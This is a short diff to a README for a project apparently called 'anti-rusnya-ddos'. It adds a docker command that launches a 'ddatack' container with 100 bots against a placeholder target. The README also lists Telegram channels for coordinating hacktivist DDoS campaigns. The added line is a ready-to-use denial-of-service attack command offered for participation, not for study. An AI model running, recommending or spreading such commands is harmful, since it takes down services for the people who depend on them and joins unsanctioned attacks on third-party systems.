@@ -1,4 +1,7 @@
 # anti-rusnya-ddos
+
+```bash docker run -it --rm lovefromukraine/antiprop:latest ddatack --bots 100 <TARGET>```
+
 # Coordination
 - https://t.me/incourse911
 - https://t.me/itarmyofukraine2022 (english posts are included)
